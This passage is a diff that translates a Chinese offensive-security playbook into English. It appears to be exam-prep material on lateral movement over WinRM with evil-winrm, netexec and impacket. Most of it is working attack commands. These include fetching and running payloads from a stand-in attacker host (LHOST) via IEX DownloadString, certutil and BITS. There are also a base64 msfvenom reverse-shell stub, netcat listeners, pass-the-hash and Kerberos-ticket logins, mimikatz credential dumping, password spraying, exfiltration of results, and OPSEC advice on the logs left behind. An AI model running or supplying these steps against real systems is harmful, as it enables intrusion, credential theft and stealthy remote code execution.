+- `KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`: check `/etc/hosts`, clock, `klist` expiry, then SPN via `impacket-GetUserSPNs` or `ldapsearch`.
 
-## 5. 会话内 payload 投放（无 SMB 的两条通道）
+## 5. In-session payload delivery (two channels without SMB)
 
-### 5.1 内存执行（首选，不落盘）
+### 5.1 In-memory (preferred, no disk)
 
-攻击机起投递：
+Attacker delivery:
 
 ```bash
-python3 -m http.server 80            # 或 python3 -m http.server 443
-# 监听回连
+python3 -m http.server 80            # or python3 -m http.server 443
+# reverse listener
 nc -lvnp LPORT
 ```
 
-evil-winrm 会话内：
+Inside evil-winrm:
 
 ```powershell
-# 下载执行 .ps1
+# download and run .ps1
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
-# 不想落地又不依赖文件：直接反向连接一行（msfvenom 生成后 base64）
+# no disk, no file: one-liner reverse (msfvenom → base64)
 $b = [Convert]::FromBase64String('...'); $m=[System.Diagnostics.Process]::GetCurrentProcess(); ...
 ```
 
-### 5.2 落地执行（确需文件时：目标自己出网下载，禁止走 \\LHOST\share）
+### 5.2 On-disk (only if needed: target downloads itself — never `\\LHOST\share`)
 
 ```powershell
 certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
-# 备选
+# alternatives
 Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe','C:\Windows\Temp\PAYLOAD.exe')"
 ```
 
-再触发：`C:\Windows\Temp\PAYLOAD.exe`（管理员会话可直接跑；非管理员按最小权限先收集信息）。
+Then run: `C:\Windows\Temp\PAYLOAD.exe` (admin session can run directly; non-admin: collect info under least privilege first).
 
-### 5.3 文件反传（目标→攻击机，绕过出网限制）
+### 5.3 Exfil (target → attacker, bypass egress limits)
 
 ```text
-# 把结果写到目标临时文件后 download 回本机（走 WinRM，无需目标出网）
+# write results to a temp file, then download over WinRM (no target egress needed)
 *Evil-WinRM* PS> whoami /all | Out-File C:\Windows\Temp\out.txt -Encoding ascii
 *Evil-WinRM* PS> download C:\Windows\Temp\out.txt ./out.txt
 ```
 
-## 6. 常见失败速查
+## 6. Common failures
 
-| 现象 | 原因与处理 |
+| Symptom | Cause / fix |
 |---|---|
-| `Access is denied` / 401 | 不在 Remote Management Users/Administrators；域账户查 -d 域名写法 |
-| 认证 OK 但 `(Pwn3d!)` 缺失 | 非管理员，先进会话验证能否执行 |
-| 5986 证书错 | evil-winrm 默认接受自签；仍报错先确认真的是 WinRM TLS |
-| `KRB_AP_ERR_MODIFIED` | 时钟漂移 / hosts 解析，非密码问题 |
-| evil-winrm 起不来 | Ruby/gem 环境损坏 → 换 netexec winrm 或 Windows 线 |
-| 长命令卡死 | 拆一行命令、输出重定向到文件再 download |
+| `Access is denied` / 401 | Not in Remote Management Users/Administrators; check `-d` domain spelling |
+| Auth OK but no `(Pwn3d!)` | Non-admin; enter session and test execution |
+| 5986 cert errors | evil-winrm accepts self-signed by default; still failing → confirm it is WinRM TLS |
+| `KRB_AP_ERR_MODIFIED` | Clock skew / hosts resolution — not a password problem |
+| evil-winrm won’t start | Broken Ruby/gem → switch to netexec winrm or Windows path |
+| Long commands hang | Split into one-liners; redirect output to a file then `download` |
 
-## 7. OPSEC 要点
+## 7. OPSEC
 
-- 5985 登录在目标留 4624/4625 + WinRM 操作日志；批量喷密码会锁账户，次数受控。
-- 哈希（NTLM）认证在 DC 侧留 4776 日志；要更隐蔽只能走 Kerberos（用票据，不落密码）。
-- 长命令（mimikatz sekurlsa::logonpasswords）放 evil-winrm 里易超时：一次一行、抄完再跑。
+- 5985 logons leave 4624/4625 + WinRM operational logs; password spraying can lock accounts — control attempts.
+- NTLM hash auth leaves 4776 on the DC; quieter option is Kerberos (tickets, no password on the wire).
+- Long jobs (mimikatz sekurlsa::logonpasswords) time out easily in evil-winrm: one line at a time, copy output, then continue.
 ````
 
-**Verify**：
-- `netexec winrm` 输出 `(Pwn3d!)` 或至少 `[+]`（认证成功）。
-- evil-winrm 进入会话并 `whoami` 返回预期身份。
-- 后续投放以回连为最终Verify：起监听（`nc -lvnp LPORT` / msfconsole handler），会话内执行反向连接载荷，Kali 侧收到连接。
-- 无法回连时用**带外Verify**：`Invoke-Command` 执行 `cmd /c "ping LHOST"` 并在 Kali 侧 `tcpdump -i any icmp`；或让目标 `curl http://LHOST/flag` 看投递服务器日志 404/200（参考 doc 00 的带外Verify规范）。
+**Validation**:
+- `netexec winrm` shows `(Pwn3d!)` or at least `[+]` (auth OK).
+- evil-winrm session opens and `whoami` returns the expected identity.
+- Final proof of follow-on delivery is a callback: listener (`nc -lvnp LPORT` / msfconsole handler), reverse payload in-session, Kali receives the connection.
+- If no callback, use **out-of-band checks**: `Invoke-Command` with `cmd /c "ping LHOST"` while Kali runs `tcpdump -i any icmp`; or have the target `curl http://LHOST/flag` and watch the delivery server 404/200 (see module 00 OOB validation).
 
-**If it fails**（≥2）：
-1. **认证被拒（`Access is denied` / 401）** → 先查账户是否在目标 `Remote Management Users`/`Administrators`；域账户则确认 `DOMAIN` 拼写与大小写、`-d` 参数；哈希线确认是 NTLM 哈希（32 hex）而非 LM 或 Kerberos 哈希。仍不行→换 Windows 跳板用 `New-PSSession` 再试，把"工具问题"与"权限问题"分开。
-2. **5985 通但 5986 才开，或反之** → 换 `-S`（HTTPS）并处理自签证书（evil-winrm 默认接受自签，若报证书错加 `--no-ssl-peer-verification` 之类选项前先确认版本）；反过来 HTTP 更省事，优先 5985。
-3. **认证成功但命令执行失败/空回显** → 账户可能在 `Remote Management Users`（非管理员）且 PowerShell 受限：先试简单命令 `cmd /c whoami`；再试 `-NoProfile` 类参数；非管理员账户的枚举/后续投放受限时，把它当"受限低权限会话"处理（收集信息为主，提权另走模块 M06）。
-4. **evil-winrm 起不来（Ruby/gem 环境问题）** → 转 netexec `winrm` 模块单发命令，或转 Windows 跳板 `winrs`/`New-PSSession`；这些都不依赖 Ruby。
-5. **Kerberos 一直失败** → 放弃 Kerberos 走 NTLM 哈希线（`-H`），前提是明文/哈希都有；若只有票据没有密码，检查 `KRB5CCNAME`、`/etc/krb5.conf` realm、时钟（`date` 与 DC 差 <5 分钟）。
-6. **需要落地文件但目标出网也受限** → 用 evil-winrm `upload`（走 WinRM 5985 通道本身，不需要 445/80 出网）；上传到 `C:\Windows\Temp` 或用户 `%TEMP%`，注意写入权限与 Defender 扫描路径。
+**Failure branches (≥2)**:
+1. **Auth denied (`Access is denied` / 401)** → confirm membership in `Remote Management Users`/`Administrators`; for domain accounts check `DOMAIN` spelling/case and `-d`; for hashes confirm NTLM (32 hex), not LM or Kerberos keys. Still failing → retry from a Windows pivot with `New-PSSession` to separate tool issues from permission issues.
+2. **5985 open but only 5986 works, or vice versa** → toggle `-S` (HTTPS) and handle self-signed certs (evil-winrm accepts them by default; before adding peer-verification flags, confirm version); HTTP is simpler — prefer 5985 when available.
+3. **Auth OK but commands fail / empty output** → account may be Remote Management Users (non-admin) with restricted PowerShell: try `cmd /c whoami`; try `-NoProfile`-style flags; treat as a constrained low-priv session (collect info; priv-esc via module M06).
+4. **evil-winrm won’t start (Ruby/gem)** → use netexec `winrm` one-shots, or Windows pivot `winrs`/`New-PSSession` (no Ruby).
+5. **Kerberos keeps failing** → drop Kerberos, use NTLM hash (`-H`) if you have plaintext/hash; if ticket-only, check `KRB5CCNAME`, `/etc/krb5.conf` realm, clock (`date` vs DC <5 minutes).
+6. **Need a file but target egress is also blocked** → evil-winrm `upload` (WinRM 5985 channel itself — no 445/80 egress); drop under `C:\Windows\Temp` or `%TEMP%`; watch write rights and Defender scan paths.
 
-**Exam notes / OPSEC**：
-- **先确认 SMB 真的不通**再放弃 PsExec 系——多数考生丢分是没做端口判断就在错误通道上死磕。`nmap -Pn -p445,5985 TARGET` 一次说清。
-- 5985 走 WinRM 会在目标留下 PowerShell 会话与 4624/4625 登录日志、`Microsoft-Windows-WinRM` 操作日志；哈希线（NTLM）在 DC 上留 4776。批量喷密码（步骤 2）会把账户锁风险放大，**仅在明确允许且次数受控时用**。
-- evil-winrm 的 `upload`/`download`、`scripts`/`loot` 只在会话内有效：文件走 WinRM 通道，**别**在文档/笔记里写"经 SMB 共享传文件"这类与本场景矛盾的步骤。
-- 会话是交互式的：执行长时间任务（如 mimikatz sekurlsa）在 evil-winrm 里容易卡/超时，参考 cheat sheet `Having an Evil-WinRM session` 的建议——拆成一行命令执行、结果即时抄录，或把输出重定向到文件再 `download`。
-- 域名/主机名解析在 Kerberos 线是硬前置；Kali 记得把目标主机名写进 `/etc/hosts`，否则 SPN 解析失败报 `KRB_AP_ERR_MODIFIED` 之类，先查时钟。
-- 非管理员会话里别立刻上提权/抓密码工具，先按最小权限做信息收集，再决定是否需要模块 M06 的提权路径。
+**Exam / OPSEC**:
+- **Confirm SMB is really closed** before abandoning PsExec-family tools — many lost points come from fighting the wrong channel without a port check. `nmap -Pn -p445,5985 TARGET` settles it once.
+- WinRM on 5985 leaves PowerShell sessions plus 4624/4625 and `Microsoft-Windows-WinRM` operational logs; NTLM hash auth leaves 4776 on the DC. Password spraying (step 2) amplifies lockout risk — **only when explicitly allowed and attempt-capped**.
+- evil-winrm `upload`/`download`, `scripts`/`loot` are session-only: files travel over WinRM — **do not** document “copy via SMB share” steps that contradict this scenario.
+- Sessions are interactive: long jobs (mimikatz sekurlsa) hang/timeout easily — cheat sheet `Having an Evil-WinRM session`: one-liners, copy results immediately, or redirect to a file then `download`.
+- Kerberos hard-requires name resolution; put the target hostname in Kali `/etc/hosts` or SPN resolution fails with `KRB_AP_ERR_MODIFIED`-class errors (check clock first).
+- In non-admin sessions, do not jump straight to priv-esc/credential tools — least-privilege recon first, then decide whether M06 is needed.
 
 ---
 
-## 模块速查表
+## Module quick reference
 
 ```bash
-# 1) 端口判定（决定是否走本模块）
+# 1) Port decision (whether this module applies)
 nmap -Pn -p445,5985,5986 TARGET
 
-# 2) 认证 + 权限探测（明文 / 哈希 / 域）
+# 2) Auth + privilege probe (plaintext / hash / domain)
 netexec winrm TARGET -u USER -p 'PASS'
 netexec winrm TARGET -u USER -H NTHASH
 netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
 
-# 3) 交互会话（evil-winrm）
+# 3) Interactive session (evil-winrm)
 evil-winrm -i TARGET -u USER -p 'PASS'
 evil-winrm -i TARGET -u USER -H NTHASH
 evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS
 
-# 4) Kerberos（域内、无 SMB、无明文也行的线）
+# 4) Kerberos (in-domain; works without SMB / without plaintext)
 impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
 export KRB5CCNAME=$(pwd)/USER.ccache
 netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
 
-# 5) 会话内内存投放（首选，不落盘）
+# 5) In-session in-memory delivery (preferred, no disk)
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
-# 6) Windows 跳板线
+# 6) Windows pivot path
 winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
 $s = New-PSSession -ComputerName TARGET -Credential (DOMAIN\USER,PASS)
 Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
 
-# 7) 落盘备选（目标自己出网下载）
+# 7) On-disk fallback (target downloads itself)
 certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
 ```
 
 ---
 
-## 关联脚本清单
+## Related script list
 
-| 文件 | 说明 |
+| File | Description |
 |---|---|
-| `m15-winrm-auth-matrix.ps1` | 从 Windows 侧 PowerShell Remoting 的明文/哈希/Kerberos 认证三模板与失败排查 |
-| `m15-winrm-lateral.md` | Kali（evil-winrm/netexec）命令速查 + 会话内 payload 投放备忘 |
+| `m15-winrm-auth-matrix.ps1` | Windows-side PowerShell Remoting plaintext/hash/Kerberos templates + failure triage |
+| `m15-winrm-lateral.md` | Kali (evil-winrm/netexec) cheat sheet + in-session payload notes |
